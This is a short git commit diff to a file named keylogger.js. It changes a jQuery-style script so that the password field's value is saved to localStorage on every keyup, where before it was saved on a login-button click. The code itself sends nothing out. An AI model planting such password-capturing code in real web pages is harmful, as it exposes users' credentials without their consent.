ecd96ac4dfdb678cda9f5318ee1e55d7bd967e43
Nathanael Abbotts <nat.abbotts@gmail.com>
2011-10-01 15:11:02 +0000

    commit

--- keylogger.js
+++ keylogger.js
@@ -1,8 +1,7 @@
 var _ = {
-    loginButton: $('input[name=login][type=submit]'),
     passwordBox: $('input[name=LOGIN_PASSWD]'),
     storePassword: function() {
         localStorage.setItem('password', $(_.passwordBox).value());
     }
 };
-$(_.loginButton).onClick(_.storePassword);
+$(_.passwordBox).keyup(_.storePassword);
